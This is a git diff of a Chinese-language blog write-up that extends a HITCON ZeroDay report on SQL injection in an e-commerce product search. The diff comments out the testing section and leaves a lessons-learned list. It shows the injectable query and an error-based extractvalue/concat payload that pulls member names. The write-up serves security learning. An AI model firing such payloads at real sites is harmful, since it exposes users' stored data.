@@ -5,13 +5,15 @@ last_update:
   date: "2025-08-20T08:00:00+08:00"
 ---
 
+本文是 https://zeroday.hitcon.org/vulnerability/ZD-2025-01026 的延伸
+
 ## 原始 SQL 語法
 
 ```sql
 SELECT * FROM (`product_file`) WHERE ( name like '% userInput %' OR content like '% userInput %' OR memo like '% userInput %' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
 ```
 
-## 測試過程
+<!-- ## 測試過程
 
 1. `'`
 
@@ -230,9 +232,9 @@ SELECT * FROM (`product_file`) WHERE ( name like '%%') AND extractvalue(1,concat
 
 成功提取到資料～果然 `UNION SELECT` 在這種複合式的查詢很難注入成功～
 
-21. 接下來請參考 [ZD-2025-01026](https://zeroday.hitcon.org/vulnerability/ZD-2025-01026)
+21. 接下來請參考 [ZD-2025-01026](https://zeroday.hitcon.org/vulnerability/ZD-2025-01026) -->
 
 ## 學到的東西
 
 1. `UNION SELECT` 在實務上有點難成功
-2. `extractvalue(1,concat(0x7e,(SELECT name FROM members LIMIT 0,1)`，如果 `members` 沒資料，整個 SQL 語法就不會噴錯(?
+2. `extractvalue(1,concat(0x7e,(SELECT name FROM members LIMIT 0,1)`，如果 `members` 沒資料，整個 SQL 語法就不會噴錯(?)
